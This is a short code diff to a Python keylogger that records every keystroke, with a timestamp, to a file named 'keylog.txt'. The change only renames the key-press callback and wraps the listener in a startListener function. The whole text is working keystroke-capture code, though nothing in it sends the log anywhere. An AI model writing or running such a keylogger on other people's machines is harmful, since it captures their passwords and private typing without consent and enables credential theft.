@@ -3,8 +3,9 @@ import logging
  
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
  
-def on_press(key):
+def onPress(key):
     logging.info(str(key))
  
-with Listener(on_press=on_press) as listener :
-    listener.join()
+def startListener():
+    with Listener(on_press=onPress) as listener :
+        listener.join() 
